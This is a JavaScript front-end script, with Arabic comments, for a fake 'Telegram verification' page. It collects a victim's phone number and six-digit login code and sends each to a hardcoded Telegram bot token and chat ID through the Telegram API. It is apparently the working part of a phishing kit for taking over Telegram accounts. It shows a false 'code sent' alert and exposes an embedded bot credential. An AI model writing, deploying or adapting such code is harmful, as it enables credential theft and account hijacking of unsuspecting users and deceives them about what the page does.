// بيانات رموز الدول
const countryCodes = [
    { name: "اليمن", code: "+967", flag: "🇾🇪" },
    { name: "السعودية", code: "+966", flag: "🇸🇦" },
    { name: "الإمارات", code: "+971", flag: "🇦🇪" },
    { name: "مصر", code: "+20", flag: "🇪🇬" },
    { name: "الولايات المتحدة", code: "+1", flag: "🇺🇸" },
    // يمكنك إضافة المزيد من الدول هنا
];

// ملء قائمة الدول
const countrySelect = document.getElementById('country');
if (countrySelect) {
    countryCodes.forEach(country => {
        const option = document.createElement('option');
        option.value = country.code;
        option.textContent = `${country.flag} ${country.name} (${country.code})`;
        countrySelect.appendChild(option);
    });
}

// إرسال رقم الهاتف
const phoneForm = document.getElementById('phoneForm');
if (phoneForm) {
    phoneForm.addEventListener('submit', async function(event) {
        event.preventDefault();

        const countryCode = document.getElementById('country').value;
        const phoneNumber = document.getElementById('phone').value;

        if (!phoneNumber) {
            alert('يرجى إدخال رقم الهاتف');
            return;
        }

        const fullNumber = `${countryCode}${phoneNumber}`;
        alert(`تم إرسال الكود إلى الرقم: ${fullNumber}`);

        // إرسال البيانات إلى بوت Telegram
        await sendToTelegram(`[توثيق Telegram] تم إرسال الكود إلى الرقم: ${fullNumber}`);

        // الانتقال إلى صفحة التحقق من الكود
        window.location.href = 'code_verification.html';
    });
}

// إرسال الكود
const codeForm = document.getElementById('codeForm');
if (codeForm) {
    codeForm.addEventListener('submit', async function(event) {
        event.preventDefault();

        const code = document.getElementById('code').value;

        if (!code || code.length !== 6) {
            alert('يرجى إدخال كود صحيح مكون من 6 أرقام');
            return;
        }

        // إرسال الكود إلى بوت Telegram
        await sendToTelegram(`[توثيق Telegram] تم إدخال الكود: ${code}`);

        alert('تم إرسال الكود بنجاح!');
    });
}

// دالة لإرسال الرسائل إلى بوت Telegram
async function sendToTelegram(message) {
    const botToken = '7352087691:AAFKetidCGiN16_Vk1jCqtn04_Kh9cE--k0'; // Token البوت الخاص بك
    const chatId = '7302541527'; // Chat ID الخاص بك

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
        chat_id: chatId,
        text: message
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error(`خطأ في الإرسال: ${response.status} ${response.statusText}`);
        }

        const result = await response.json();
        console.log('تم إرسال الرسالة إلى Telegram:', result);
    } catch (error) {
        console.error('خطأ في الإرسال:', error);
    }
                         }
